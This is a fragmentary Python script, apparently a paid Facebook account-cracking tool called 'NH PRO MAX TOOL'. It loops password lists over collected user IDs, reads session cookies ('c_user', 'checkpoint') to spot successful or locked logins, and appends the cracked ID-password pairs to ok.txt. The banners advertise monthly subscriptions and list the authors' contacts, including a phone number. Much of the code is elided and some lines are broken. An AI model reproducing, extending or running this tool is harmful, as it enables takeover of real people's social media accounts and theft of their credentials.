...
def main():
    ...
    print('\033[1;92m│\033[1;37m[03] \033[1;96mPUBLIC CLONING \033[1;37m[\033[1;32mV E R Y S L O W\033[1;37m]\033[1;31m \033[1;32m      │')
    ...
    if CracKing in ('6', '06'):
    	os.system("xdg-open https://www.facebook.com/Itz.Nisad.Host")
    if CracKing in ('7', '07'):
        time.sleep(2)
    ...
    if CracKing in ('0', '00'):
        exit('THANKS FOR USING NH PRO MAX TOOL')  
    else:
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mNISAD\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mNISAD-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mNISAD-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mShahnoor\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[NISAD-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					...
					pass
				print('\r\033[1;91m[NISAD-CP] %s | %s%s      ' % (user,pw,tahun(user)))
...
def publiccrack():
    ...
    os.system('clear')
    print(banner)
    os.system('rm -rf .NISAD1.txt')
    os.system('rm -rf .NISAD2.txt')
...
def create_file():
    ...
    for links in range(ask_link):
        completed +=1
        li = ('1')
        os.system('cat .NISAD1.txt | grep '+li+' >> .NISAD2.txt')
    ...
    os.system('clear')
    lines = open('.NISAD2.txt', 'r').readlines()
    print(banner)
    ...
    version()
if not os.path.exists(".NISADwork.txt"):
	open(".NISADwork.txt", 'w').close()
class load:
    def __init__(self):
        _ = ''
        __ = int('30')
...
≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠                                           
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;32m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32mTOUFIQ AHMED │\033[1;37m• \033[1;36mTHIS TOOL IS PAID \033[1;37m•\033[1;32m  │
\033[1;32m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32mToufiQ Picchi│\033[1;37m• \033[1;36mPER MONTH PACKAGE \033[1;37m• \033[1;32m │
\033[1;32m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m01812027446  │\033[1;32m──────────────────────\033[1;32m │
\033[1;32m│\033[1;31m➣\033[1;37m  GITHUB \033[1;31m:\033[1;32mTOUFIQ-AHMED │\033[1;37m \033[1;36mSTATUS \033[1;31m= \033[1;36mFREE 1 WEEK \033[1;37m\033[1;32m │
\033[1;32m└────────────────────────────────────────────────┘
\033[1;32m│     \033[1;37m• THIS TOOL CREATED BY TOUFIQ-AHMED \033[1;37m•     \033[1;32m │
\033[1;32m└────────────────────────────────────────────────┘
"""
ct = datetime.now()
n = ct.month
